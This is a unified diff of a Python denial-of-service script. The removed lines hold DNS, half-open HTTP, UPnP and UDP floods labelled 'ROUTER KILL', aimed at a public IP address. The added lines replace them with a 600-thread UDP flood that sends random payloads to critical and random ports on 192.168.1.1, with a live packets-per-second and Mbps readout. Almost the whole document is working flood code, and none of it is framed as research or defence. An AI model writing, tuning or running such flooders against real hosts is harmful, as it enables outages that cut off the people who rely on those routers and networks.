@@ -3,87 +3,162 @@ import threading
 import time
 import random
 
-TARGET_IP = "62.109.121.42"  # YOUR ROUTER IP
+TARGET_IP = "192.168.1.1"  # YOUR ROUTER
 
-# ROUTER KILLER METHODS
-def router_dns_kill():
-    """DNS requests overload router's DNS resolver"""
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    dns_query = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x03www\x06google\x03com\x00\x00\x01\x00\x01'
+# THREAD BREAKDOWN
+UDP_RAPID_PPS = 150    # Fast small packets
+UDP_PPS = 150          # Regular PPS
+UDP_RAPID_BW = 150     # Fast large packets  
+UDP_BW = 150           # Regular bandwidth
+TOTAL_THREADS = 600
+
+# Global counters
+total_packets = 0
+total_bytes = 0
+
+# ==================== UDP RAPID PPS (FAST SMALL) ====================
+def udp_rapid_pps(thread_id):
+    global total_packets, total_bytes
     
-    while True:
-        try:
-            # Router MUST process DNS queries
-            sock.sendto(dns_query, (TARGET_IP, 53))
-            time.sleep(0.001)  # Prevent own network flood
-        except:
-            pass
-
-def router_http_kill():
-    """HTTP requests to router admin page"""
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        try:
-            sock.connect((TARGET_IP, 80))
-            # Send partial HTTP request (hangs connection)
-            sock.send(b'GET / HTTP/1.1\r\nHost: ' + TARGET_IP.encode() + b'\r\n')
-            # DON'T CLOSE - leave hanging
-            time.sleep(5)  # Keep connection open
-            sock.close()
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        except:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            time.sleep(0.1)
-
-def router_upnp_kill():
-    """UPnP discovery requests"""
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    ssdp = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n'
-    
-    while True:
-        try:
-            # Send to router's UPnP
-            sock.sendto(ssdp, (TARGET_IP, 1900))
-            time.sleep(0.01)
-        except:
-            pass
-
-def router_arp_flood():
-    """ARP requests to overload router's ARP table"""
-    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-    # Raw ARP flooding (requires different approach)
-    pass
-
-# SIMPLE FLOOD (for bandwidth)
-def simple_udp_flood():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
         try:
-            sock.sendto(b'X' * 1472, (TARGET_IP, random.randint(20000, 60000)))
+            # MAXIMUM SPEED - 64 byte packets
+            for _ in range(25):  # 25 packets per loop
+                payload = random.randbytes(64)
+                
+                # RAPID FIRE to all critical ports
+                for port in [53, 80, 443, 123, 161, 1900]:
+                    sock.sendto(payload, (TARGET_IP, port))
+                    total_packets += 1
+                    total_bytes += 64
+                    
         except:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            try:
+                sock.close()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            except:
+                pass
 
-# START ATTACK
-print("ROUTER KILL MODE ACTIVATED")
-print(f"Target: {TARGET_IP}")
-print("Methods: DNS + HTTP + UPnP + UDP")
+# ==================== UDP PPS (REGULAR) ====================
+def udp_pps(thread_id):
+    global total_packets, total_bytes
+    
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        try:
+            # Regular PPS - 128 byte packets
+            for _ in range(15):
+                payload = random.randbytes(128)
+                
+                # Attack range of ports
+                for _ in range(8):
+                    port = random.randint(1, 65535)
+                    sock.sendto(payload, (TARGET_IP, port))
+                    total_packets += 1
+                    total_bytes += 128
+                    
+        except:
+            try:
+                sock.close()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            except:
+                pass
 
-# Start threads
-for _ in range(50):
-    threading.Thread(target=router_dns_kill, daemon=True).start()
+# ==================== UDP RAPID BANDWIDTH (FAST LARGE) ====================
+def udp_rapid_bw(thread_id):
+    global total_packets, total_bytes
+    
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        try:
+            # Fast bandwidth - 1024 byte packets
+            for _ in range(8):
+                payload = random.randbytes(1024)
+                
+                # Hammer bandwidth ports
+                for port in [80, 443, 8080, 8443]:
+                    sock.sendto(payload, (TARGET_IP, port))
+                    total_packets += 1
+                    total_bytes += 1024
+                    
+        except:
+            try:
+                sock.close()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            except:
+                pass
 
-for _ in range(20):
-    threading.Thread(target=router_http_kill, daemon=True).start()
+# ==================== UDP BANDWIDTH (REGULAR LARGE) ====================
+def udp_bandwidth(thread_id):
+    global total_packets, total_bytes
+    
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        try:
+            # Maximum bandwidth - 1472 byte packets (max UDP)
+            for _ in range(5):
+                payload = random.randbytes(1472)
+                
+                # Saturate all ports
+                for _ in range(6):
+                    port = random.randint(1, 65535)
+                    sock.sendto(payload, (TARGET_IP, port))
+                    total_packets += 1
+                    total_bytes += 1472
+                    
+        except:
+            try:
+                sock.close()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            except:
+                pass
 
-for _ in range(30):
-    threading.Thread(target=router_upnp_kill, daemon=True).start()
+# ==================== LAUNCH ALL 600 THREADS ====================
+# Start UDP Rapid PPS
+for i in range(UDP_RAPID_PPS):
+    t = threading.Thread(target=udp_rapid_pps, args=(i,))
+    t.daemon = True
+    t.start()
 
-for _ in range(100):
-    threading.Thread(target=simple_udp_flood, daemon=True).start()
+# Start UDP PPS
+for i in range(UDP_PPS):
+    t = threading.Thread(target=udp_pps, args=(i,))
+    t.daemon = True
+    t.start()
 
-# SIMPLE LOGGING
+# Start UDP Rapid Bandwidth
+for i in range(UDP_RAPID_BW):
+    t = threading.Thread(target=udp_rapid_bw, args=(i,))
+    t.daemon = True
+    t.start()
+
+# Start UDP Bandwidth
+for i in range(UDP_BW):
+    t = threading.Thread(target=udp_bandwidth, args=(i,))
+    t.daemon = True
+    t.start()
+
+# ==================== LOGGING ONLY ====================
+last_log = time.time()
+
 while True:
-    print(f"ATTACKING ROUTER {TARGET_IP}")
-    time.sleep(5)
+    time.sleep(1)
+    current = time.time()
+    elapsed = current - last_log
+    last_log = current
+    
+    # Calculate
+    pps = int(total_packets / elapsed) if elapsed > 0 else 0
+    mbps = (total_bytes * 8) / (elapsed * 1000000) if elapsed > 0 else 0
+    
+    # Reset
+    total_packets = 0
+    total_bytes = 0
+    
+    # SK1-SSALG LOGGING ONLY
+    print(f"SK1-SSALG | {pps:,}/s | {mbps:.1f}Mbps")
